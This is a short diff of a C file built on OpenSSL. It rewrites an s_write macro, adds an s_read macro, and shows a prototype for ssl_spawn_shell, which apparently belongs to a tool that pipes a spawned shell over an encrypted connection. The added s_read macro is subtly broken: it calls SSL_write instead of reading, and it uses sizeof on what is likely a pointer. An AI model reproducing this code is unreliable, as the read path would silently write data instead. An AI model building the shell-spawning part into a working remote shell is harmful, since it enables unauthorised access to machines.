@@ -13,7 +13,8 @@
 SSL_CTX *ctx;
 SSL *ssl;
 
-#define s_write(buf) (void)SSL_write(ssl, buf, strlen(buf))
+#define s_write(buf) SSL_write(ssl, buf, strlen(buf))
+#define s_read(buf) SSL_write(ssl, buf, sizeof(buf))
 
 int write_loop(int fd, char *buf);
 int ssl_spawn_shell(int stdin[], int stdout[]);
